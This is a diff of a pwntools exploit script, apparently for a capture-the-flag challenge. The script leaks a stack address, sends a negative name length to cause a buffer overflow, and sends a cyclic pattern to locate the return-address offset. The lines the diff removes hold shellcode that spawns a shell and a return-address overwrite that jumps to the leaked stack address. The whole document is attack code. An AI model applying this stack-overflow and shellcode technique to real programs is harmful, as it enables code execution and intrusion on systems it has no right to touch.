@@ -1,9 +1,9 @@
 
 from pwn import *
 
-#context.log_level = 'DEBUG'
+context.log_level = 'DEBUG'
 context(os='linux', arch='amd64')
-context.terminal = ["tmux", "splitw", "-v"]
+context.terminal = ["tmux", "splitw", "-h"]
 
 padding_length = 104
 ret_offset = -96
@@ -26,32 +26,18 @@ stack_address = u64(stack_address, endian='big')
 stack_address += ret_offset
 log.success(f'Leaked stack address: {p64(stack_address)}')
 
-log.info('Send email and agent')
-io.sendlineafter('Email: ', 'test@test.test')
-io.sendlineafter('Age: ', '666')
+log.info('Send email and age')
+io.sendlineafter(': ', 'email')
+io.sendlineafter(': ', 'age')
 
 log.info('Send Name Lenght')
-io.sendlineafter('Length of name: ', '-1')
+io.sendlineafter(': ', '-1')
 
 payload = cyclic(200)
 
 log.info('Send payload to name')
 io.sendlineafter('Name: ', payload)
 
-#log.info('Send Password')
-#io.sendlineafter('> ', '2')
-#io.sendlineafter('password: ', password)
-
-#log.info('Send payload')
-#shellcode = asm(
-#    shellcraft.popad() +
-#    shellcraft.sh()
-#)
-#padding = b'A' * (ret_offset - len(shellcode))
-#payload = shellcode + padding + p64(stack_address)
-#io.sendlineafter('commands: ', payload)
-
-#log.info('Trigger Return')
-#io.sendlineafter('> ', '3')
+#RSP first 4 bytes -> cyclic_find('baab') -> offset RIP
 
 io.interactive()
